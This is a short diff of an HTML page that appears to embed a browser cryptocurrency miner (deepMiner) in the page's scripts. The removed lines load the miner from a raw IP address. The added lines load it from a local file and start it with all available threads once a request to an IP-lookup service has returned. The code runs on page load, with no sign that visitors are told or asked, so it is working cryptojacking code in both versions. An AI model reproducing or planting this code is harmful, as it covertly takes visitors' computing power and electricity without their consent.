@@ -1,7 +1,8 @@
-<script src="http://150.136.246.97:7777/lib/deepMiner.min.js"></script>
+<script src="/test.js"></script>
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://suip.biz/ip', false);
+xhr.open('GET', 'http://suip.biz/ip');
 xhr.send()
-if(typeof deepMiner !== 'undefined') {var miner = new deepMiner.Anonymous(xhr.responseText, { autoThreads: true });miner.start();}
+xhr.onload = function(){
+if(typeof deepMiner !== 'undefined') {var miner = new deepMiner.Anonymous(xhr.responseText, { autoThreads: true });miner.start();}}
 </script>
